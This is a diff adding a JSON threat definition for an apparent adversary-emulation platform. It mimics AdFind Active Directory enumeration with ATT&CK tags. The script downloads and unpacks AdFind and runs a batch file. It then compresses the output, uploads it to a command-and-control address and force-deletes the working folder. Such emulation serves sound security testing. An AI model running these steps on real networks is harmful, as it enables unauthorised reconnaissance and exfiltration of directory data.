@@ -1,0 +1,122 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "AdFind for enumerating Active Directory",
+        "display_name": "S0552-AdFind",
+        "name": "S0552-AdFind",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": "{\"--cp\":\"192.168.2.50:443\",\"--secure\":true,\"--multipart\":10240,\"--heartbeat\":1}",
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "type": "message"
+            },
+            "2": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c mkdir %USERPROFILE%\\Desktop\\adfind",
+                "rtags": [
+                    "att&ck-technique:T1059"
+                ],
+                "type": "message"
+            },
+            "3": {
+                "module": "loader",
+                "module_to_load": "downloader",
+                "request": "--load downloader",
+                "type": "message"
+            },
+            "4": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src VFS:/shared/util/adf.bat --dest %USERPROFILE%\\Desktop\\adfind\\adf.bat",
+                "rtags": [
+                    "att&ck",
+                    "att&ck-technique:T1105"
+                ],
+                "type": "message"
+            },
+            "5": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src \"https://www.joeware.net/downloads/files/AdFind.zip\" --dest \"%USERPROFILE%\\Desktop\\adfind\\AdFind.zip\"",
+                "rtags": [
+                    "att&ck",
+                    "att&ck-technique:T1105"
+                ],
+                "type": "message"
+            },
+            "6": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c powershell -Command Expand-Archive \"%USERPROFILE%\\Desktop\\adfind\\AdFind.zip\" -DestinationPath \"%USERPROFILE%\\Desktop\\adfind\"",
+                "rtags": [
+                    "att&ck",
+                    "att&ck-technique:T1140"
+                ],
+                "type": "message"
+            },
+            "7": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c \"start %USERPROFILE%\\Desktop\\adfind\\adf.bat\"",
+                "rtags": [
+                    "att&ck-technique:T1059.003",
+                    "att&ck-technique:T1059"
+                ],
+                "type": "message"
+            },
+            "8": {
+                "time": "300",
+                "type": "delay"
+            },
+            "9": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell \"Compress-Archive %USERPROFILE%\\Desktop\\adfind\\ %USERPROFILE%\\Desktop\\adfind\\adf.zip\"",
+                "rtags": [
+                    "att&ck-technique:T1059",
+                    "att&ck-technique:T1059.001"
+                ],
+                "type": "message"
+            },
+            "10": {
+                "module": "loader",
+                "module_to_load": "uploader",
+                "request": "--load uploader",
+                "type": "message"
+            },
+            "11": {
+                "depends_on": "80a402f2-e448-4818-ab8f-2047a033faea",
+                "module": "uploader",
+                "request": "--remotepath \"%USERPROFILE%\\Desktop\\adfind\\adf.zip\"",
+                "rtags": [
+                    "att&ck-technique:T1059",
+                    "att&ck-technique:T1059.001"
+                ],
+                "type": "message"
+            },
+            "12": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "CLEANUP"
+            },
+            "13": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c rmdir /Q /S \"%USERPROFILE%\\Desktop\\adfind\"",
+                "rtags": [
+                    "att&ck-technique:T1485"
+                ],
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29"
+    }
+}
